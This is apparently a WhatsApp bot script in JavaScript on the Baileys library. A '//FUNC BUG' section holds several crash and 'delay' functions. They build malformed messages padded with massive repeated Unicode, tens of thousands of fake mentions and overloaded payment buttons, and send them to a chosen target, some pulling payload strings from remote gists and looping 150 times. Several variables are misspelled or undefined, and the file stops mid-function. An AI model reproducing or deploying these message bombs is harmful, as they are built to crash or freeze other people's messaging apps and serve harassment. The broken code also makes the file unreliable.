require('./config');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const moment = require("moment-timezone");
const path = require("path")
const os = require('os')
const sharp = require('sharp')
const pino = require('pino');
const didyoumean = require('didyoumean');
const similarity = require('similarity');
const figlet = require('figlet');
const yts = require('yt-search');
const gradient = require('gradient-string');
const readline = require("readline");
const logger = pino({ level: 'debug' });
const JsConfuser = require("js-confuser");
const search = require("yt-search");
const { youtube } = require("btch-downloader");
const fetch = require('node-fetch');
const { GoogleGenerativeAI } = require ("@google/generative-ai");
const { Client } = require('ssh2');
const crypto = require('crypto');
const makeid = crypto.randomBytes(3).toString('hex')
const { Sticker } = require("wa-sticker-formatter");
const ffmpeg = require("fluent-ffmpeg");
const channel = JSON.parse(fs.readFileSync("./database/channel.json"))
const tanggals = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')

const {
    spawn, 
    exec,
    execSync 
   } = require('child_process');
const { makeWASocket, makeCacheableSignalKeyStore, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, PHONENUMBER_MCC, AnyMessageContent, useMultiFileAuthState, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys')


module.exports = client = async (client, m, chatUpdate, store) => {
    try {
        const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "");
        const content = JSON.stringify(m.message)
        
        const isText = ["extendedTextMessage", "conversation"].includes(m.mtype)
		const isImage = ["imageMessage"].includes(m.mtype)
		const isVideo = ["videoMessage"].includes(m.mtype)
		const isSticker = ["stickerMessage"].includes(m.mtype)
		const isAudio = ["audioMessage"].includes(m.mtype) && !(m.message[m.mtype]?.ptt)
		const isVoice = ["audioMessage"].includes(m.mtype) && !!(m.message[m.mtype]?.ptt)
		const isViewOnce = ["viewOnceMessageV2", "viewOnceMessage"].includes(m.mtype)
		const isContact = ["contactMessage", "contactsArrayMessage"].includes(m.mtype)
		const isLocation = ["locationMessage"].includes(m.mtype)
		const isDocument = ["documentMessage", "documentWithCaptionMessage"].includes(m.mtype)
		const isProtocol = ["protocolMessage"].includes(m.mtype)
		const isPollUpdate = ["pollUpdateMessage"].includes(m.mtype)
		const isPollCreation = ["pollCreationMessage"].includes(m.mtype)
		const isButtonList = ["interactiveResponseMessage"].includes(m.mtype)
		const isButtonReply = ["templateButtonReplyMessage"].includes(m.mtype)
		const isAllMedia = ["imageMessage", "videoMessage", "stickerMessage", "audioMessage", "viewOnceMessageV2", "viewOnceMessage", "contactMessage", "contactsArrayMessage", "locationMessage", "documentMessage", "documentWithCaptionMessage"].includes(m.mtype)
		const isQuotedViewOnce = m.mtype === "extendedTextMessage" && content.includes("viewOnceMessage")
 const getQuoted = (m.quoted || m)      
        const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
        
        const sender = m.key.fromMe ? client.user.id.split(":")[0] + "@s.whatsapp.net" || client.user.id
: m.key.participant || m.key.remoteJid;
        
        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = global.prefa

        const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : ''
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
        const creator = JSON.parse(fs.readFileSync('./database/owner.json'))
        const botNumber = await client.decodeJid(client.user.id);
        const isPremium = premium.includes(m.sender)
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const command2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const isCreator = [botNumber, ...creator, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const text = q = args.join(" ");
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);

        const groupMetadata = isGroup ? await client.groupMetadata(m.chat).catch((e) => {}) : "";
        const groupName = m.isGroup ? groupMetadata.subject : "";
        const participants = isGroup ? await groupMetadata.participants : "";
        const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
        const groupMembers = isGroup ? groupMetadata.participants : "";
        const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./library/myfunction');
        
const { pinterest, pinterest2, remini, mediafire, tiktokDl , spotifyDl , searchSpotifyTracks, convertDuration, convertAngka, ytdl, tiktokSearchVideo, delay, text2img, listModels, getModels, listSampler, pickRandom, getJobs, spotifyDown, rsz } = require('./library/scraper');

if (m.message) {
console.log(chalk.blue('╭─────────────────────────'));
console.log(chalk.green('│ 📩 New Message!'));
console.log(chalk.blue('├─────────────────────────'));
console.log(chalk.yellow(`│ Tanggal: `) + chalk.cyan(new Date().toLocaleString()));
console.log(chalk.yellow(`│ Pesan: `) + chalk.white(m.body || m.mtype));
console.log(chalk.yellow(`│ Pengirim: `) + chalk.magenta(pushname));
console.log(chalk.yellow(`│ JID: `) + chalk.red(senderNumber));
if (m.isGroup) {
console.log(chalk.blue('├─────────────────────────'));
console.log(chalk.yellow(`│ Grup: `) + chalk.green(groupName));
console.log(chalk.yellow(`│ Group JID: `) + chalk.red(m.chat));
    }
console.log(chalk.blue('╰────────────────────────\n'));
}

const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${OwnerName}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6283122635477:+62 831-2267-5477\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

// END
const reply = async (teks) => {
return client.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: "𝐇𝐞𝐩𝐡𝐚𝐞𝐬𝐭𝐮𝐬 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟏.𝟎", 
body: `© 𝐀𝐥𝐝𝐳 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫`, 
thumbnailUrl: global.imageUrl, 
sourceUrl: null, 
}}}, {quoted: qkontak })
}

client.ments = async (text) => {
    return [m.sender];
};

const example = (teks) => {
return `\n *Example Command :*\n *${prefix+command}* ${teks}\n`
}
async function CatBox(filePath) {
	try {
            if (!fs.existsSync(filePath)) {
                throw new Error("File not found");
            }

            const form = new FormData();
            form.append('reqtype', 'fileupload');
            form.append('fileToUpload', fs.createReadStream(filePath));

            const response = await axios.post('https://catbox.moe/user/api.php', form, {
                headers: {
 ...form.getHeaders()
                }
            });

            if (response.status === 200 && response.data) {
                return response.data.trim(); // Mengembalikan URL file yang diunggah
            } else {
                throw new Error(`Upload failed with status: ${response.status}`);
            }
        } catch (err) {
            throw new Error(`Upload failed: ${err.message}`);
       }
     }
async function VideoHD(inputPath, outputPath, callback) {
  ffmpeg(inputPath)
    .videoCodec("libx264")
    .size("1280x720")
    .on("end", () => {
      console.log("Video berhasil diubah menjadi HD.");
      callback(null, outputPath);
    })
    .on("error", (err) => {
      console.error("Terjadi kesalahan: ", err.message);
      callback(err, null);
    })
    .save(outputPath);
}
// FUNC HARI
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴍᴀʟᴀᴍ️'
        }
        if(time2 < "19:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴘᴇᴛᴀɴɢ'
        }
        if(time2 < "18:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱᴏʀᴇ'
        }
        if(time2 < "15:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱɪᴀɴɢ️'
        }
        if(time2 < "10:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴘᴀɢɪ'
        }
        if(time2 < "05:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱᴜʙᴜʜ'
        }
        if(time2 < "03:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴛᴇɴɢᴀʜ ᴍᴀʟᴀᴍ'
        }

//FUNC BUG
async function SpaceGroup(target) {
if (!target.includes("@s.whatsapp.net") && !target.includes("@g.us")) {
console.error("Error: Target JID tidak valid!", target);
return;
}
let apiGrup;
try {
  const res = await fetch('https://raw.githubusercontent.com/alwaysZuroku/AlwaysZuroku/main/ApiClient.json');
  apiGrup = await res.text();
} catch (err) {
  console.error("error fetching", err);
  return;
}

let Msg = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2,
},
interactiveMessage: {
contextInfo: {
mentionedJid: [target],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
businessOwnerJid: target,
},
},
body: {
text: "🔥꙰",
},
nativeFlowMessage: {
buttons: [
{  name: "single_select",
buttonParamsJson: apiGrup + " ↯ 𝔛𝔠𝔯𝔞𝔰𝔥",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + " ↯ 𝔛𝔠𝔯𝔞𝔰𝔥",
}, 
{
name: "payment_method",
buttonParamsJson: ""
},
{
name: "payment_status",
buttonParamsJson: ""
},
{
name: "review_order",
buttonParamsJson: "" }
],
},
},
},
},
};
for (let i = 0; i < 150; i++) {  
try {
await client.relayMessage(target, Msg, {});
await new Promise(resolve => setTimeout(resolve, 1000));
} catch (err) {
console.error("Error mengirim bug:", err);
break; 
}
}
}
async function CrashApp4(isTarget) {
if (!isTarget.includes("@s.whatsapp.net") && !isTarget.includes("@g.us")) {
console.error("Error: Target JID tidak valid!", isTarget);
return;
}
      let apaLo = JSON.stringify({
        status: true,
        criador: "VenomMods",
        resultado: {
          type: "md",
          ws: {
            _events: {
              "CB:ib,,dirty": ["Array"]
            },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
              version: ["Array"],
              browser: ["Array"],
              waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
              clientCectTimeoutMs: 20000,
              keepAliveIntervalMs: 30000,
              logger: {},
              printQRInTerminal: false,
              emitOwnEvents: true,
              defaultQueryTimeoutMs: 60000,
              customUploadHosts: [],
              retryRequestDelayMs: 250,
              maxMsgRetryCount: 5,
              fireInitQueries: true,
              auth: {
                Object: "authData"
              },
              markOnlineOnclientCect: true,
              syncFullHistory: true,
              linkPreviewImageThumbnailWidth: 192,
              transactionOpts: {
                Object: "transactionOptsData"
              },
              generateHighQualityLinkPreview: false,
              options: {},
              appStateMacVerification: {
                Object: "appStateMacData"
              },
              mobile: true
            }
          }
        }
      });
      let stanza = [{
        attrs: {
          biz_bot: "1"
        },
        tag: "bot"
      }, {
        attrs: {},
        tag: "biz"
      }];
      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 3.2,
              isStatusBroadcast: true,
              statusBroadcastJid: "status@broadcast",
              badgeChat: {
                unreadCount: 9999
              }
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "proto@newsletter",
              serverMessageId: 1,
              newsletterName: `안녕..     - 〽${"ꥈ안녕..ꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: `안녕.. ********************************""""" ${"﹏".repeat(102002)}`
            },
            interactiveMessage: {
              contextInfo: {
                businessMessageForwardInfo: {
                  businessOwnerJid: isTarget
                },
                dataSharingContext: {
                  showMmDisclosure: true
                },
                participant: "0@s.whatsapp.net",
                mentionedJid: ["13135550002@s.whatsapp.net"]
              },
              body: {
                text: "" + "᭡꧈".repeat(102002) + "".repeat(102002)
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "single_select",
                  buttonParamsJson: ApaLo + "".repeat(9999)
                }, {
                  name: "payment_method",
                  buttonParamsJson: ApaLo + "".repeat(9999)
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: ApaLo + "".repeat(9999),
                  voice_call: "call_galaxy"
                }, {
                  name: "form_message",
                  buttonParamsJson: ApaLo + "".repeat(9999)
                }, {
                  name: "wa_payment_learn_more",
                  buttonParamsJson: ApaLo + "".repeat(9999)
                }, {
                  name: "wa_payment_transaction_details",
                  buttonParamsJson: ApaLo + "".repeat(9999)
                }, {
                  name: "wa_payment_fbpin_reset",
                  buttonParamsJson: ApaLo + "".repeat(9999)
                }, {
                  name: "catalog_message",
                  buttonParamsJson: ApaLo + "".repeat(9999)
                }, {
                  name: "payment_info",
                  buttonParamsJson: ApaLo + "".repeat(9999)
                }, {
                  name: "review_order",
                  buttonParamsJson: ApaLo + "".repeat(9999)
                }, {
                  name: "send_location",
                  buttonParamsJson: ApaLo + "".repeat(9999)
                }, {
                  name: "payments_care_csat",
                  buttonParamsJson: ApaLo + "".repeat(9999)
                }, {
                  name: "view_product",
                  buttonParamsJson: ApaLo + "".repeat(9999)
                }, {
                  name: "payment_settings",
                  buttonParamsJson: ApaLo + "".repeat(9999)
                }, {
                  name: "address_message",
                  buttonParamsJson: ApaLo + "".repeat(9999)
                }, {
                  name: "automated_greeting_message_view_catalog",
                  buttonParamsJson: ApaLo + "".repeat(9999)
                }, {
                  name: "open_webview",
                  buttonParamsJson: ApaLo + "".repeat(9999)
                }, {
                  name: "message_with_link_status",
                  buttonParamsJson: ApaLo + "".repeat(9999)
                }, {
                  name: "payment_status",
                  buttonParamsJson: ApaLo + "".repeat(9999)
                }, {
                  name: "galaxy_costum",
                  buttonParamsJson: ApaLo + "".repeat(9999)
                }, {
                  name: "extensions_message_v2",
                  buttonParamsJson: ApaLo + "".repeat(9999)
                }, {
                  name: "landline_call",
                  buttonParamsJson: ApaLo + "".repeat(9999)
                }, {
                  name: "mpm",
                  buttonParamsJson: ApaLo + "".repeat(9999)
                }, {
                  name: "cta_copy",
                  buttonParamsJson: ApaLo + "".repeat(9999)
                }, {
                  name: "cta_url",
                  buttonParamsJson: ApaLo + "".repeat(9999)
                }, {
                  name: "review_and_pay",
                  buttonParamsJson: ApaLo + "".repeat(9999)
                }, {
                  name: "galaxy_message",
                  buttonParamsJson: ApaLo + "".repeat(9999)
                }, {
                  name: "cta_call",
                  buttonParamsJson: ApaLo + "".repeat(9999)
                }]
              }
            }
          }
        },
        additionalNodes: stanza,
        stanzaId: `stanza_${Date.now()}`
      };
      await client.relayMessage(isTarget, message, {
        participant: {
          jid: isTarget
        }
      });
      console.log(`Succes Attack Target ${isTarget}`)
    }
async function CrashApp3(isTarget) {
if (!isTarget.includes("@s.whatsapp.net") && !isTarget.includes("@g.us")) {
console.error("Error: Target JID tidak valid!", isTarget);
return;
}
let apiClient;
try {
  const res = await fetch('https://gist.githubusercontent.com/Tama-Ryuichi/572ad67856a67dbae3c37982679153b2/raw/apiClient.json');
  apiClient = await res.text();
} catch (err) {
  console.error("error fetching", err);
  return;
}

let stanza = [
{ attrs: { biz_bot: "1" }, tag: "bot" },
{ attrs: {}, tag: "biz" }
];

let message = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 3.2,
isStatusBroadcast: true,
statusBroadcastJid: "status@broadcast",
badgeChat: { unreadCount: 9999 }
},
forwardedNewsletterMessageInfo: {
newsletterJid: "proto@newsletter",
serverMessageId: 1,
newsletterName: `᭡꧈  - 〽${"ꥈ  ꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: `᭡꧈""""" ${"﹏".repeat(102002)}`,
},
interactiveMessage: {
contextInfo: {
businessMessageForwardInfo: { businessOwnerJid: isTarget },
dataSharingContext: { showMmDisclosure: true },
participant: "0@s.whatsapp.net",
mentionedJid: ["13135550002@s.whatsapp.net"],
},
body: {
text: "\u0003" + "᭡ꦽ꧈".repeat(102002) + "\u0003".repeat(102002)
}, 
nativeFlowMessage: {
buttons: [
{ name: "single_select", 
buttonParamsJson: apiClient + "\u0003".repeat(9999) },
{ name: "payment_method", 
buttonParamsJson: apiClient + "\u0003".repeat(9999) },
{ name: "call_permission_request", 
buttonParamsJson: apiClient + "\u0003".repeat(9999), voice_call: "call_galaxy" },
{ name: "form_message", 
buttonParamsJson: apiClient + "\u0003".repeat(9999) },
{ name: "wa_payment_learn_more", 
buttonParamsJson: apiClient + "\u0003".repeat(9999) },
{ name: "wa_payment_transaction_details", 
buttonParamsJson: apiClient + "\u0003".repeat(9999) },
{ name: "wa_payment_fbpin_reset", 
buttonParamsJson: apiClient + "\u0003".repeat(9999) },
{ name: "catalog_message", 
buttonParamsJson: apiClient + "\u0003".repeat(9999) },
{ name: "payment_info", 
buttonParamsJson: apiClient + "\u0003".repeat(9999) },
{ name: "review_order", 
buttonParamsJson: apiClient + "\u0003".repeat(9999) },
{ name: "send_location", 
buttonParamsJson: apiClient + "\u0003".repeat(9999) },
{ name: "payments_care_csat", 
buttonParamsJson: apiClient + "\u0003".repeat(9999) },
{ name: "view_product", 
buttonParamsJson: apiClient + "\u0003".repeat(9999) },
{ name: "payment_settings", 
buttonParamsJson: apiClient + "\u0003".repeat(9999) },
{ name: "address_message", 
buttonParamsJson: apiClient + "\u0003".repeat(9999) },
{ name: "automated_greeting_message_view_catalog", buttonParamsJson: apiClient + "\u0003".repeat(9999) },
{ name: "open_webview", 
buttonParamsJson: apiClient + "\u0003".repeat(9999) },
{ name: "message_with_link_status", 
buttonParamsJson: apiClient + "\u0003".repeat(9999) },
{ name: "payment_status", 
buttonParamsJson: apiClient + "\u0003".repeat(9999) },
{ name: "galaxy_costum", 
buttonParamsJson: apiClient + "\u0003".repeat(9999) },
{ name: "extensions_message_v2", 
buttonParamsJson: apiClient + "\u0003".repeat(9999) },
{ name: "landline_call", 
buttonParamsJson: apiClient + "\u0003".repeat(9999) },
{ name: "mpm", 
buttonParamsJson: apiClient + "\u0003".repeat(9999) },
{ name: "cta_copy", 
buttonParamsJson: apiClient + "\u0003".repeat(9999) },
{ name: "cta_url", 
buttonParamsJson: apiClient + "\u0003".repeat(9999) },
{ name: "review_and_pay", 
buttonParamsJson: apiClient + "\u0003".repeat(9999) },
{ name: "galaxy_message", 
buttonParamsJson: apiClient + "\u0003".repeat(9999) },
{ name: "cta_call", buttonParamsJson: apiClient + "\u0003".repeat(9999) }
]
}
}
}
},
additionalNodes: stanza,
stanzaId: `stanza_${Date.now()}`
};
await client.relayMessage(isTarget, message, { participant: { jid: isTarget } });
console.log(`Succes Attack Target ${isTarget}`)
}
async function HephDelay(target, mention = true) { // Default true biar otomatis nyala
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
 title: "𝐇𝐞𝐩𝐡𝐚𝐞𝐬𝐭𝐮𝐬 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟏.𝟎 Here",
 listType: 2,
 buttonText: null,
 sections: delaymention,
 singleSelectReply: { selectedRowId: "🔴" },
 contextInfo: {
     mentionedJid: Array.from({ length: 30000 }, () => 
         "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
     ),
     participant: target,
     remoteJid: "status@broadcast",
     forwardingScore: 9741,
     isForwarded: true,
     forwardedNewsletterMessageInfo: {
         newsletterJid: "333333333333@newsletter",
         serverMessageId: 1,
         newsletterName: "-"
     }
 },
 description: "Dont Bothering Me Bro!!!"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await client.relayMessage("status@broadcast", mess.message, {
        messageId: mess.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
 {
     tag: "mentioned_users",
     attrs: {},
     content: [
         {
             tag: "to",
             attrs: { jid: target },
             content: undefined
         }
     ]
 }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (mention) {
        await client.relayMessage(
            target,
            {
                statusMentionMessage: {
 message: {
     protocolMessage: {
         key: mess.key,
         type: 25
     }
 }
                }
            },
            {
                additionalNodes: [
 {
     tag: "meta",
     attrs: { is_status_mention: "𝐇𝐞𝐩𝐡𝐚𝐞𝐬𝐭𝐮𝐬 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟏.𝟎 Here Bro" },
     content: undefined
 }
                ]
            }
        );
    }
console.log(`Succes Attack Target ${terget}`)
}

async function HephDelay3(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
 url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
 mimetype: "video/mp4",
 fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
 fileLength: "999999",
 seconds: 999999,
 mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
 caption: "\u200D".repeat(1000),
 height: 999999,
 width: 999999,
 fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
 directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
 mediaKeyTimestamp: "1743742853",
 contextInfo: {
     isSampled: true,
     mentionedJid: [
         target, "13135550002@s.whatsapp.net",
         ...Array.from({ length: 30000 }, () =>
             `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
         )
     ]
 },
 streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
 thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
 thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
 thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
 annotations: [
     {
         embeddedContent: {
             embeddedMusic: {
                 musicContentMediaId: "kontol",
                 songId: "peler",
                 author: "\u9999",
                 title: "\u9999",
                 artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                 artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                 artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                 artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                 countryBlocklist: true,
                 isExplicit: true,
                 artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
             }
         },
         embeddedAction: null
     }
 ]
                }
            }
        }
    }, {});

    await client.relayMessage("status@broadcast", mess.message, {
        messageId: mess.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
 {
     tag: "mentioned_users",
     attrs: {},
     content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
 }
                ]
            }
        ]
    });

    if (mention) {
        await client.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: mess.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}
    async function HephDelay2(target, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
 url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
 mimetype: "image/jpeg",
 caption: "Come here kiddo - AmbaCrash",
 fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
 fileLength: "19769",
 height: 354,
 width: 783,
 mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
 fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
 directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
 mediaKeyTimestamp: "1743225419",
 jpegThumbnail: null,
 scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
 scanLengths: [2437, 17332],
 contextInfo: {
     mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
     isSampled: true,
     participant: target,
     remoteJid: "status@broadcast",
     forwardingScore: 9741,
     isForwarded: true
 }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await client.relayMessage("status@broadcast", mess.message, {
        messageId: mess.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
 {
     tag: "mentioned_users",
     attrs: {},
     content: [
         {
             tag: "to",
             attrs: { jid: target },
             content: undefined
         }
     ]
 }
                ]
            }
        ]
    });

    if (mention) {
        await client.relayMessage(
            target,
            {
                statusMentionMessage: {
 message: {
     protocolMessage: {
         key: mess.key,
         type: 25
     }
 }
                }
            },
            {
                additionalNodes: [
 {
     tag: "meta",
     attrs: { is_status_mention: "@HephDelay" },
     content: undefined
 }
                ]
            }
        );
    }
}
    
async function HephDelay1(target, mention) {
const delaymention = Array.from({ length: 9741 }, (_, r) => ({
title: "᭯".repeat(9741),
rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
}));

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "@HephDelaynibos",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "🌀" },
contextInfo: {
mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
participant: target,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "9741@newsletter",
serverMessageId: 1,
newsletterName: "-"
}
},
description: "( # )"
}
}
},
contextInfo: {
channelMessage: true,
